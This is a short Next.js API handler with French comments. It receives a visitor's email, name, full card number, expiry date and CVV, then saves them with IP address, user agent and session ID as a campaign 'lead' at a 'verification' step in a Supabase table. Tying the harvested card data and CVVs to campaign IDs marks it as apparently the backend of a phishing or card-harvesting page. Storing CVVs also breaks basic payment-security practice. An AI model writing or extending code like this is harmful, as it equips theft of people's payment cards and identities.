import { LeadService } from '../../lib/supabase';

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Méthode non autorisée' });
  }

  try {
    const { 
      campaignId, 
      email, 
      firstName,
      cardName,
      cardNumber,
      expiryDate, // Changé de cardExpiry à expiryDate
      cvv,       // Changé de cardCvv à cvv
      selectedPlan
    } = req.body;

    // Validation des données requises
    if (!campaignId || !email) {
      return res.status(400).json({ 
        error: 'Campaign ID et email sont requis' 
      });
    }

    // Récupérer les informations de la requête
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    const userAgent = req.headers['user-agent'];
    const sessionId = req.headers['x-session-id'] || `session_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;

    const leadData = {
      email,
      first_name: firstName,
      card_name: cardName,
      card_number: cardNumber,
      card_expiry: expiryDate, // Correspondre à la colonne de la table
      card_cvv: cvv,           // Correspondre à la colonne de la table
      selected_plan: selectedPlan,
      ip_address: ip,
      user_agent: userAgent,
      session_id: sessionId
    };

    console.log('Données de vérification à envoyer:', {
      ...leadData,
      card_number: leadData.card_number ? '****' + leadData.card_number.slice(-4) : 'vide',
      card_cvv: leadData.card_cvv ? '***' : 'vide'
    });

    const lead = await LeadService.createOrUpdateLead(campaignId, leadData, 'verification');

    res.status(200).json({ 
      success: true, 
      lead: {
        id: lead.id,
        email: lead.email,
        first_name: lead.first_name,
        verification_submitted: !!lead.verification_submitted_at,
        selected_plan: lead.selected_plan
      }
    });

  } catch (error) {
    console.error('Erreur lors du tracking de verification:', error);
    res.status(500).json({ 
      error: 'Erreur serveur lors du tracking',
      details: error.message 
    });
  }
}
